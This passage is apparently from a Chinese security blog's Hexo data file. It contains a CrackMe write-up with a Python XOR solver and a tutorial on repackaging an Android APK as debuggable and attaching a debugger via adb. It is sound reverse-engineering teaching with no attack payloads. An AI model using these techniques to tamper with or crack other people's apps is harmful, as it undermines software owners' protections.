:"public/2019/10/10/重装环境/index.html","hash":"166a4a217c4ec5a3ad9ed9166dacc6d381e11a82","modified":1605408710226},{"_id":"public/2019/09/06/Lunlayloo 木马/index.html","hash":"7d8fe216b03e3a55e55ea1305121f37bbc8090fd","modified":1605408710226},{"_id":"public/2019/09/04/H-WORM变种远控分析/index.html","hash":"045f757f18b73fc8e7a2c2e650a592bc54d5072d","modified":1605408710226},{"_id":"public/2019/09/03/替换特权指令 提升权限/index.html","hash":"738080317c18e55fc5ef59e5ff5017673181d934","modified":1605408710226},{"_id":"public/2019/09/02/利用弱口令传播横向的远控组件/index.html","hash":"192a89d963ec445f110e9ad59ef3c4842e924d3e","modified":1605408710226},{"_id":"public/2019/08/26/输入法注入/index.html","hash":"a573c706e3c7f34d50cf99f8322c5ba329939d70","modified":1605408710226},{"_id":"public/2019/08/26/远线程注入/index.html","hash":"bcc93ce0101d547fbe1c6ff348593b85eefa8aa4","modified":1605408710226},{"_id":"public/2019/08/26/SEH创建与查找/index.html","hash":"d26930fc1ae2f1e5077ff813a09f90eb7628c188","modified":1605408710226},{"_id":"public/2019/08/22/MASH和内联MASH/index.html","hash":"8bd517c8d0ec5bd78269bb5a914da18100347074","modified":1605408710226},{"_id":"public/index.html","hash":"e71e17a32f4c454b792a8d77cecd34b1807642d0","modified":1605408710226},{"_id":"public/page/2/index.html","hash":"d6da78954aa04610353dcd7347300a39e8a39dc4","modified":1605408710226},{"_id":"public/page/3/index.html","hash":"9a9977a57cba0bcba6e81822585c76587e6bd6d2","modified":1605408710226},{"_id":"public/page/4/index.html","hash":"b0a9724a3a259e132ff51866f0c5474674179cfa","modified":1605408710226},{"_id":"public/links/index.html","hash":"b2d675c065183b4ea93d9dba9e336a3f78f1c2c0","modified":1605408710231},{"_id":"public/CNAME","hash":"4602429ac3e0a8a9160128c89615c9443f37b6f4","modified":1605408710231},{"_id":"public/img/police_beian.png","hash":"90efded6baa2dde599a9d6b1387973e8e64923ea","modified":1605408710231},{"_id":"public/img/apple-touch-icon.png","hash":"3cfddd2c90062ed36471afe50d13d89f04d513d5","modified":1605408710231},{"_id":"public/img/default.png","hash":"7bb2b8ee07db305bcadee2985b81b942027ae940","modified":1605408710231},{"_id":"public/img/favicon.png","hash":"3cfddd2c90062ed36471afe50d13d89f04d513d5","modified":1605408710231},{"_id":"public/img/loading.gif","hash":"2d2fc0f947940f98c21afafef39ecf226a2e8d55","modified":1605408710231},{"_id":"public/js/main.js","hash":"c1bee0e5ba4f4fe121549bd1122266446810d6b2","modified":1605408713466},{"_id":"public/css/main.css","hash":"8aeeab41f6cc53b0627c7191574294c9542919f1","modified":1605408713466},{"_id":"public/js/lazyload.js","hash":"bb11c0a419de1fc4ce1ef633574ce0f9b91e1441","modified":1605408713466},{"_id":"public/js/local-search.js","hash":"66046f2ad85aa22fd64bbd0e968a498a2c5bfbaa","modified":1605408713466},{"_id":"public/lib/prettify/tomorrow-night.min.css","hash":"535256d676d247d3282e9a8ae2777c6f7df4fdc6","modified":1605408713466},{"_id":"public/lib/prettify/github-v2.min.css","hash":"da1b8e6d4df1f044d12f461880e677d65dbbf2d3","modified":1605408713466},{"_id":"public/lib/prettify/tomorrow-night-eighties.min.css","hash":"a5f2102fc148359a92435b170f3bfb25e1221837","modified":1605408713466},{"_id":"public/lib/prettify/tomorrow.min.css","hash":"ea61879c64ca73a5ea233b1315faf7f2fdfebca9","modified":1605408713466},{"_id":"public/img/avatar.png","hash":"cafb95b0484606acb19b13a46e972786b172f76f","modified":1605408713678}],"Category":[{"name":"逆向","_id":"ckhiiw61j0007ccuqh2ftl8gm"},{"name":"样本详细分析","_id":"ckhiiw628000rccuqa51bd5v4"},{"name":"编程","_id":"ckhiiw62k000xccuqu7cxaezv"}],"Data":[],"Page":[],"Post":[{"title":"32位转64位 easy_CrackMe","index_img":"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200602184341253.png","banner_img":"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200602184341253.png","date":"2020-05-03T16:00:00.000Z","_content":"\n## 背景\n\n\n参考来源：\n\nhttps://moliam.github.io/2018/11/17/Wow64-at-the-assemly-level.html\n\n思路来源汪师傅\n\n## 主要原理\n\n64位系统中运行32位程序时是使用Wow64来辅助执行的，主要是可以通过控制cs寄存器来改变CPU执行命令标准，当cs=0x23时按照32位可执行性程序执行，当cx=0x33时按照64位标准执行\n\n所以通过调整cs寄存器就可以在32位程序中执行64位的代码\n\n### 难点\n\n常规调试器无法同时调试32位和64位代码\n\n到达64代码无法单步跟踪\n\n详情可参考 https://www.anquanke.com/post/id/171111\n\n开发的时候64位汇编需要完全硬编码后转汇编码写进去，修改的时候基本要完全重写一次汇编\n\n### 逆向过程\n\n无壳无混淆\n\n使用od调试到达`0x401100`跑飞，可以看到是大跳，且修改了段寄存器位`0x33`\n\n这里的目标地址是`0x401090`\n\n![image-20200602184341253](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200602185117668.png)\n\n使用`IDA_64` 找到对应数据，根据前面修改了段寄存器cs为0x33，所以这里箭头所指的代码就因该是64位的代码\n\n![image-20200602184654770](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200602184654770.png)\n\n**请注意，是使用64位的IDA，不是32位的**\n\n按下`alt+s`将代码按照64位反编译\n\n\n\n![image-20200602185117668](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200602184341253.png)\n\n然后按**G**跳转到**0x401090**处，按下**x**，将数据按汇编代码识别\n\n![image-20200602185444980](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200602191541585.png)\n\n这就是隐藏在32位中的64位代码，逻辑很简单，两个异或后就能处flag\n\n将输入的flag的前8位 xor 0x1949194820192019 结果要等于 0x2D70283347784C7F\n\n后8位xor 0x1949194820192019  等于 0x6478296510280D20\n\n由于数据在内存中是小端序排列，所以异或后算出的值需要倒置一下\n\n脚本如下\n\n```python\ndef hex2asc(hexs):\n    res = \"\"\n    for i in range(0, len(hexs), 2):\n        res += chr(int(hexs[i:i+2], 16))\n    return res\n\nv1 = 0x2D70283347784C7F ^ 0x1949194820192019\nv2 = 0x6478296510280D20 ^ 0x1949194820192019\nfrist8 = (str(hex(v1)))[2:]\nlast8 = (str(hex(v2)))[2:]\nres = hex2asc(frist8)\nprint(res[::-1],end=\"\")\n\nres = hex2asc(last8)\nprint(res[::-1])\n\n```\n\n测试最终结果\n\n![image-20200602191541585](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200602185444980.png)","source":"_posts/32转64_CrakeMe.md","raw":"---\ntitle: 32位转64位 easy_CrackMe\ntags: [CrakeMe]\nindex_img: https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200602184341253.png\nbanner_img: https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200602184341253.png\ndate: 2020-5-4\n---\n\n## 背景\n\n\n参考来源：\n\nhttps://moliam.github.io/2018/11/17/Wow64-at-the-assemly-level.html\n\n思路来源汪师傅\n\n## 主要原理\n\n64位系统中运行32位程序时是使用Wow64来辅助执行的，主要是可以通过控制cs寄存器来改变CPU执行命令标准，当cs=0x23时按照32位可执行性程序执行，当cx=0x33时按照64位标准执行\n\n所以通过调整cs寄存器就可以在32位程序中执行64位的代码\n\n### 难点\n\n常规调试器无法同时调试32位和64位代码\n\n到达64代码无法单步跟踪\n\n详情可参考 https://www.anquanke.com/post/id/171111\n\n开发的时候64位汇编需要完全硬编码后转汇编码写进去，修改的时候基本要完全重写一次汇编\n\n### 逆向过程\n\n无壳无混淆\n\n使用od调试到达`0x401100`跑飞，可以看到是大跳，且修改了段寄存器位`0x33`\n\n这里的目标地址是`0x401090`\n\n![image-20200602184341253](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200602185117668.png)\n\n使用`IDA_64` 找到对应数据，根据前面修改了段寄存器cs为0x33，所以这里箭头所指的代码就因该是64位的代码\n\n![image-20200602184654770](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200602184654770.png)\n\n**请注意，是使用64位的IDA，不是32位的**\n\n按下`alt+s`将代码按照64位反编译\n\n\n\n![image-20200602185117668](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200602184341253.png)\n\n然后按**G**跳转到**0x401090**处，按下**x**，将数据按汇编代码识别\n\n![image-20200602185444980](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200602191541585.png)\n\n这就是隐藏在32位中的64位代码，逻辑很简单，两个异或后就能处flag\n\n将输入的flag的前8位 xor 0x1949194820192019 结果要等于 0x2D70283347784C7F\n\n后8位xor 0x1949194820192019  等于 0x6478296510280D20\n\n由于数据在内存中是小端序排列，所以异或后算出的值需要倒置一下\n\n脚本如下\n\n```python\ndef hex2asc(hexs):\n    res = \"\"\n    for i in range(0, len(hexs), 2):\n        res += chr(int(hexs[i:i+2], 16))\n    return res\n\nv1 = 0x2D70283347784C7F ^ 0x1949194820192019\nv2 = 0x6478296510280D20 ^ 0x1949194820192019\nfrist8 = (str(hex(v1)))[2:]\nlast8 = (str(hex(v2)))[2:]\nres = hex2asc(frist8)\nprint(res[::-1],end=\"\")\n\nres = hex2asc(last8)\nprint(res[::-1])\n\n```\n\n测试最终结果\n\n![image-20200602191541585](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200602185444980.png)","slug":"32转64_CrakeMe","published":1,"updated":"2020-07-05T08:55:48.474Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckhiiw60u0000ccuq2yrsugqd","content":"<h2 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h2><p>参考来源：</p>\n<p><a href=\"https://moliam.github.io/2018/11/17/Wow64-at-the-assemly-level.html\" target=\"_blank\" rel=\"noopener\">https://moliam.github.io/2018/11/17/Wow64-at-the-assemly-level.html</a></p>\n<p>思路来源汪师傅</p>\n<h2 id=\"主要原理\"><a href=\"#主要原理\" class=\"headerlink\" title=\"主要原理\"></a>主要原理</h2><p>64位系统中运行32位程序时是使用Wow64来辅助执行的，主要是可以通过控制cs寄存器来改变CPU执行命令标准，当cs=0x23时按照32位可执行性程序执行，当cx=0x33时按照64位标准执行</p>\n<p>所以通过调整cs寄存器就可以在32位程序中执行64位的代码</p>\n<h3 id=\"难点\"><a href=\"#难点\" class=\"headerlink\" title=\"难点\"></a>难点</h3><p>常规调试器无法同时调试32位和64位代码</p>\n<p>到达64代码无法单步跟踪</p>\n<p>详情可参考 <a href=\"https://www.anquanke.com/post/id/171111\" target=\"_blank\" rel=\"noopener\">https://www.anquanke.com/post/id/171111</a></p>\n<p>开发的时候64位汇编需要完全硬编码后转汇编码写进去，修改的时候基本要完全重写一次汇编</p>\n<h3 id=\"逆向过程\"><a href=\"#逆向过程\" class=\"headerlink\" title=\"逆向过程\"></a>逆向过程</h3><p>无壳无混淆</p>\n<p>使用od调试到达<code>0x401100</code>跑飞，可以看到是大跳，且修改了段寄存器位<code>0x33</code></p>\n<p>这里的目标地址是<code>0x401090</code></p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200602185117668.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200602184341253\"></p>\n<p>使用<code>IDA_64</code> 找到对应数据，根据前面修改了段寄存器cs为0x33，所以这里箭头所指的代码就因该是64位的代码</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200602184654770.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200602184654770\"></p>\n<p><strong>请注意，是使用64位的IDA，不是32位的</strong></p>\n<p>按下<code>alt+s</code>将代码按照64位反编译</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200602184341253.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200602185117668\"></p>\n<p>然后按<strong>G</strong>跳转到<strong>0x401090</strong>处，按下<strong>x</strong>，将数据按汇编代码识别</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200602191541585.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200602185444980\"></p>\n<p>这就是隐藏在32位中的64位代码，逻辑很简单，两个异或后就能处flag</p>\n<p>将输入的flag的前8位 xor 0x1949194820192019 结果要等于 0x2D70283347784C7F</p>\n<p>后8位xor 0x1949194820192019  等于 0x6478296510280D20</p>\n<p>由于数据在内存中是小端序排列，所以异或后算出的值需要倒置一下</p>\n<p>脚本如下</p>\n<pre><code class=\"python\">def hex2asc(hexs):\n    res = &quot;&quot;\n    for i in range(0, len(hexs), 2):\n        res += chr(int(hexs[i:i+2], 16))\n    return res\n\nv1 = 0x2D70283347784C7F ^ 0x1949194820192019\nv2 = 0x6478296510280D20 ^ 0x1949194820192019\nfrist8 = (str(hex(v1)))[2:]\nlast8 = (str(hex(v2)))[2:]\nres = hex2asc(frist8)\nprint(res[::-1],end=&quot;&quot;)\n\nres = hex2asc(last8)\nprint(res[::-1])\n</code></pre>\n<p>测试最终结果</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200602185444980.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200602191541585\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h2><p>参考来源：</p>\n<p><a href=\"https://moliam.github.io/2018/11/17/Wow64-at-the-assemly-level.html\" target=\"_blank\" rel=\"noopener\">https://moliam.github.io/2018/11/17/Wow64-at-the-assemly-level.html</a></p>\n<p>思路来源汪师傅</p>\n<h2 id=\"主要原理\"><a href=\"#主要原理\" class=\"headerlink\" title=\"主要原理\"></a>主要原理</h2><p>64位系统中运行32位程序时是使用Wow64来辅助执行的，主要是可以通过控制cs寄存器来改变CPU执行命令标准，当cs=0x23时按照32位可执行性程序执行，当cx=0x33时按照64位标准执行</p>\n<p>所以通过调整cs寄存器就可以在32位程序中执行64位的代码</p>\n<h3 id=\"难点\"><a href=\"#难点\" class=\"headerlink\" title=\"难点\"></a>难点</h3><p>常规调试器无法同时调试32位和64位代码</p>\n<p>到达64代码无法单步跟踪</p>\n<p>详情可参考 <a href=\"https://www.anquanke.com/post/id/171111\" target=\"_blank\" rel=\"noopener\">https://www.anquanke.com/post/id/171111</a></p>\n<p>开发的时候64位汇编需要完全硬编码后转汇编码写进去，修改的时候基本要完全重写一次汇编</p>\n<h3 id=\"逆向过程\"><a href=\"#逆向过程\" class=\"headerlink\" title=\"逆向过程\"></a>逆向过程</h3><p>无壳无混淆</p>\n<p>使用od调试到达<code>0x401100</code>跑飞，可以看到是大跳，且修改了段寄存器位<code>0x33</code></p>\n<p>这里的目标地址是<code>0x401090</code></p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200602185117668.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200602184341253\"></p>\n<p>使用<code>IDA_64</code> 找到对应数据，根据前面修改了段寄存器cs为0x33，所以这里箭头所指的代码就因该是64位的代码</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200602184654770.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200602184654770\"></p>\n<p><strong>请注意，是使用64位的IDA，不是32位的</strong></p>\n<p>按下<code>alt+s</code>将代码按照64位反编译</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200602184341253.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200602185117668\"></p>\n<p>然后按<strong>G</strong>跳转到<strong>0x401090</strong>处，按下<strong>x</strong>，将数据按汇编代码识别</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200602191541585.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200602185444980\"></p>\n<p>这就是隐藏在32位中的64位代码，逻辑很简单，两个异或后就能处flag</p>\n<p>将输入的flag的前8位 xor 0x1949194820192019 结果要等于 0x2D70283347784C7F</p>\n<p>后8位xor 0x1949194820192019  等于 0x6478296510280D20</p>\n<p>由于数据在内存中是小端序排列，所以异或后算出的值需要倒置一下</p>\n<p>脚本如下</p>\n<pre><code class=\"python\">def hex2asc(hexs):\n    res = &quot;&quot;\n    for i in range(0, len(hexs), 2):\n        res += chr(int(hexs[i:i+2], 16))\n    return res\n\nv1 = 0x2D70283347784C7F ^ 0x1949194820192019\nv2 = 0x6478296510280D20 ^ 0x1949194820192019\nfrist8 = (str(hex(v1)))[2:]\nlast8 = (str(hex(v2)))[2:]\nres = hex2asc(frist8)\nprint(res[::-1],end=&quot;&quot;)\n\nres = hex2asc(last8)\nprint(res[::-1])\n</code></pre>\n<p>测试最终结果</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200602185444980.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200602191541585\"></p>\n"},{"title":"Android Studio动态调试Smali 和 插桩","index_img":"https://gitee.com//L0yy/BlogImg/raw/master/typora/remote-debugging.png","banner_img":"https://gitee.com//L0yy/BlogImg/raw/master/typora/remote-debugging.png","date":"2020-03-29T16:00:00.000Z","_content":"\n## 前言\n\n无源码调试Smali，很有必要\n\nJVM：夜神模拟器 V6.6.0.5101\n\n开发环境：Android Studio 3.6.1\n\n文中的目标APK命名为：`Nothing.apk`\n\n\n\nAndroid Killer V1.3.1.0（下面简称AK）\n\n夜神模拟器或真机\n\n演示APK：https://gitee.com/L0yy/android_series/raw/master/%E4%BE%8B%E5%AD%90/crackme1.apk\n\n\n\n## 安装插件\n\nhttps://bitbucket.org/JesusFreke/smali/downloads/\n\n**这个包在页面下方**\n\n![image-20200330172401980](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200330172401980.png)\n\n安装位置在设置的插件中，如图\n\n![image-20200330172515100](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200330172515100.png)\n\n## 反编译APK\n\n一般release版本都是不支持调试的，先解包\n\n`apktool d Nothing.apk`\n\n修改`AndroidManifest.xml` 中的调试选项\n\n在`application`中添加`android:debuggable=\"true\"`\n\n![image-20200330172920337](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200330181158966.png)\n\n修改后回包\n\n`apktool b . -o Nothing_path.apk`\n\n这里的apk还没有签名，如何签名参考上一篇文章\n\n[http://l0yy.gitee.io/cray/2019/12/14/android%E9%80%86%E5%90%91%E4%B8%80/](http://l0yy.gitee.io/cray/2019/12/14/android逆向一/)\n\n-----------\n\n**后面的操作都是建立在这个`Nothing_path.apk`上的**\n\n----------\n\n## 安装Nothing_path.apk\n\n**法1：直接把apk拖进去自动安装**\n\n**法2：使用adb**\n\n先链接到模拟器,再安装\n\n```shell\nadb connect 127.0.0.1:62001\t\t\t//夜神模拟器固定链接端口62001\nadb install Nothing_path.apk\n```\n\n\n\n为了方便后期调试，这里将要调试的程序以调试模式开启，让它等待调试。\n\n标准格式 \n\n`adb shell am start -D -n packagename/packagename.MainActivity`\n\n我的命令如下\n\n`adb shell am start -D -n com.cray.nothing/com.cray.nothing.MainActivity`\n\n![image-20200330181158966](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200330175318198.png)\n\n\n\n## 配置调试器 AS\n\n**打开apktool 解包生成的目录**\n\n![image-20200330175318198](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200330172920337.png)\n\n打开后在AS目录如下 \n\n![image-20200330175900669](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200330175900669.png)\n\n接下来每一步都要做\n\n1. 设置源根目录\n\n   右键Smali，选择make Drectory As -> sourses root \n\n   有多少个Smali文件夹就设置多少\n\n   但是也有将整个项目都设为Soourses root（未尝试）\n\n2. 设置SDK\n\n   右键项目，open modlue setting 然后选择Project 选择一个本机的SDK\n\n   ![image-20200330180417381](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200330180417381.png)\n\n3. 配置调试器选项\n\n   基本配置都好了，配置下调试选项就行\n\n   选择 Run -->Edit Configurations，增加一个Remote调试的调试选项\n\n   注意红色表注的就行，其他默认\n\n   ![image-20200330180811567](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200330181702261.png)\n\n\n\n### 连接模拟器调试\n\n打开cmd\n\n查询模拟器中所有的进程\n\n`adb shell ps`\n\n找到packName的PID\n\n这里的PID 是`3336`\n\n![image-20200330181315755](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200330180811567.png)\n\n最后做一个端口转发\n\n`adb forward tcp:5005 jdwp:3336`\n\n\n\n回到AS中，在入口处下个断点\n\n然后调试，成功如下图\n\n![image-20200330181702261](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200330181315755.png)\n\n\n\nohhhhhhh :star:\n\n","source":"_posts/Android Studio动态调试Smali.md","raw":"---\ntitle: Android Studio动态调试Smali 和 插桩\ntags: [Android]\nindex_img: https://gitee.com//L0yy/BlogImg/raw/master/typora/remote-debugging.png\nbanner_img: https://gitee.com//L0yy/BlogImg/raw/master/typora/remote-debugging.png\ndate: 2020-3-30\n---\n\n## 前言\n\n无源码调试Smali，很有必要\n\nJVM：夜神模拟器 V6.6.0.5101\n\n开发环境：Android Studio 3.6.1\n\n文中的目标APK命名为：`Nothing.apk`\n\n\n\nAndroid Killer V1.3.1.0（下面简称AK）\n\n夜神模拟器或真机\n\n演示APK：https://gitee.com/L0yy/android_series/raw/master/%E4%BE%8B%E5%AD%90/crackme1.apk\n\n\n\n## 安装插件\n\nhttps://bitbucket.org/JesusFreke/smali/downloads/\n\n**这个包在页面下方**\n\n![image-20200330172401980](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200330172401980.png)\n\n安装位置在设置的插件中，如图\n\n![image-20200330172515100](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200330172515100.png)\n\n## 反编译APK\n\n一般release版本都是不支持调试的，先解包\n\n`apktool d Nothing.apk`\n\n修改`AndroidManifest.xml` 中的调试选项\n\n在`application`中添加`android:debuggable=\"true\"`\n\n![image-20200330172920337](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200330181158966.png)\n\n修改后回包\n\n`apktool b . -o Nothing_path.apk`\n\n这里的apk还没有签名，如何签名参考上一篇文章\n\n[http://l0yy.gitee.io/cray/2019/12/14/android%E9%80%86%E5%90%91%E4%B8%80/](http://l0yy.gitee.io/cray/2019/12/14/android逆向一/)\n\n-----------\n\n**后面的操作都是建立在这个`Nothing_path.apk`上的**\n\n----------\n\n## 安装Nothing_path.apk\n\n**法1：直接把apk拖进去自动安装**\n\n**法2：使用adb**\n\n先链接到模拟器,再安装\n\n```shell\nadb connect 127.0.0.1:62001\t\t\t//夜神模拟器固定链接端口62001\nadb install Nothing_path.apk\n```\n\n\n\n为了方便后期调试，这里将要调试的程序以调试模式开启，让它等待调试。\n\n标准格式 \n\n`adb shell am start -D -n packagename/packagename.MainActivity`\n\n我的命令如下\n\n`adb shell am start -D -n com.cray.nothing/com.cray.nothing.MainActivity`\n\n![image-20200330181158966](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200330175318198.png)\n\n\n\n## 配置调试器 AS\n\n**打开apktool 解包生成的目录**\n\n![image-20200330175318198](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200330172920337.png)\n\n打开后在AS目录如下 \n\n![image-20200330175900669](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200330175900669.png)\n\n接下来每一步都要做\n\n1. 设置源根目录\n\n   右键Smali，选择make Drectory As -> sourses root \n\n   有多少个Smali文件夹就设置多少\n\n   但是也有将整个项目都设为Soourses root（未尝试）\n\n2. 设置SDK\n\n   右键项目，open modlue setting 然后选择Project 选择一个本机的SDK\n\n   ![image-20200330180417381](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200330180417381.png)\n\n3. 配置调试器选项\n\n   基本配置都好了，配置下调试选项就行\n\n   选择 Run -->Edit Configurations，增加一个Remote调试的调试选项\n\n   注意红色表注的就行，其他默认\n\n   ![image-20200330180811567](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200330181702261.png)\n\n\n\n### 连接模拟器调试\n\n打开cmd\n\n查询模拟器中所有的进程\n\n`adb shell ps`\n\n找到packName的PID\n\n这里的PID 是`3336`\n\n![image-20200330181315755](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200330180811567.png)\n\n最后做一个端口转发\n\n`adb forward tcp:5005 jdwp:3336`\n\n\n\n回到AS中，在入口处下个断点\n\n然后调试，成功如下图\n\n![image-20200330181702261](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200330181315755.png)\n\n\n\nohhhhhhh :star:\n\n","slug":"Android Studio动态调试Smali","published":1,"updated":"2020-03-31T10:48:00.292Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckhiiw6190001ccuqf76alw9v","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>无源码调试Smali，很有必要</p>\n<p>JVM：夜神模拟器 V6.6.0.5101</p>\n<p>开发环境：Android Studio 3.6.1</p>\n<p>文中的目标APK命名为：<code>Nothing.apk</code></p>\n<p>Android Killer V1.3.1.0（下面简称AK）</p>\n<p>夜神模拟器或真机</p>\n<p>演示APK：<a href=\"https://gitee.com/L0yy/android_series/raw/master/%E4%BE%8B%E5%AD%90/crackme1.apk\" target=\"_blank\" rel=\"noopener\">https://gitee.com/L0yy/android_series/raw/master/%E4%BE%8B%E5%AD%90/crackme1.apk</a></p>\n<h2 id=\"安装插件\"><a href=\"#安装插件\" class=\"headerlink\" title=\"安装插件\"></a>安装插件</h2><p><a href=\"https://bitbucket.org/JesusFreke/smali/downloads/\" target=\"_blank\" rel=\"noopener\">https://bitbucket.org/JesusFreke/smali/downloads/</a></p>\n<p><strong>这个包在页面下方</strong></p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200330172401980.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200330172401980\"></p>\n<p>安装位置在设置的插件中，如图</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200330172515100.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200330172515100\"></p>\n<h2 id=\"反编译APK\"><a href=\"#反编译APK\" class=\"headerlink\" title=\"反编译APK\"></a>反编译APK</h2><p>一般release版本都是不支持调试的，先解包</p>\n<p><code>apktool d Nothing.apk</code></p>\n<p>修改<code>AndroidManifest.xml</code> 中的调试选项</p>\n<p>在<code>application</code>中添加<code>android:debuggable=&quot;true&quot;</code></p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200330181158966.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200330172920337\"></p>\n<p>修改后回包</p>\n<p><code>apktool b . -o Nothing_path.apk</code></p>\n<p>这里的apk还没有签名，如何签名参考上一篇文章</p>\n<p><a href=\"http://l0yy.gitee.io/cray/2019/12/14/android逆向一/\">http://l0yy.gitee.io/cray/2019/12/14/android%E9%80%86%E5%90%91%E4%B8%80/</a></p>\n<hr>\n<p><strong>后面的操作都是建立在这个<code>Nothing_path.apk</code>上的</strong></p>\n<hr>\n<h2 id=\"安装Nothing-path-apk\"><a href=\"#安装Nothing-path-apk\" class=\"headerlink\" title=\"安装Nothing_path.apk\"></a>安装Nothing_path.apk</h2><p><strong>法1：直接把apk拖进去自动安装</strong></p>\n<p><strong>法2：使用adb</strong></p>\n<p>先链接到模拟器,再安装</p>\n<pre><code class=\"shell\">adb connect 127.0.0.1:62001            //夜神模拟器固定链接端口62001\nadb install Nothing_path.apk</code></pre>\n<p>为了方便后期调试，这里将要调试的程序以调试模式开启，让它等待调试。</p>\n<p>标准格式 </p>\n<p><code>adb shell am start -D -n packagename/packagename.MainActivity</code></p>\n<p>我的命令如下</p>\n<p><code>adb shell am start -D -n com.cray.nothing/com.cray.nothing.MainActivity</code></p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200330175318198.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200330181158966\"></p>\n<h2 id=\"配置调试器-AS\"><a href=\"#配置调试器-AS\" class=\"headerlink\" title=\"配置调试器 AS\"></a>配置调试器 AS</h2><p><strong>打开apktool 解包生成的目录</strong></p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200330172920337.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200330175318198\"></p>\n<p>打开后在AS目录如下 </p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200330175900669.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200330175900669\"></p>\n<p>接下来每一步都要做</p>\n<ol>\n<li><p>设置源根目录</p>\n<p>右键Smali，选择make Drectory As -&gt; sourses root </p>\n<p>有多少个Smali文件夹就设置多少</p>\n<p>但是也有将整个项目都设为Soourses root（未尝试）</p>\n</li>\n<li><p>设置SDK</p>\n<p>右键项目，open modlue setting 然后选择Project 选择一个本机的SDK</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200330180417381.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200330180417381\"></p>\n</li>\n<li><p>配置调试器选项</p>\n<p>基本配置都好了，配置下调试选项就行</p>\n<p>选择 Run –&gt;Edit Configurations，增加一个Remote调试的调试选项</p>\n<p>注意红色表注的就行，其他默认</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200330181702261.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200330180811567\"></p>\n</li>\n</ol>\n<h3 id=\"连接模拟器调试\"><a href=\"#连接模拟器调试\" class=\"headerlink\" title=\"连接模拟器调试\"></a>连接模拟器调试</h3><p>打开cmd</p>\n<p>查询模拟器中所有的进程</p>\n<p><code>adb shell 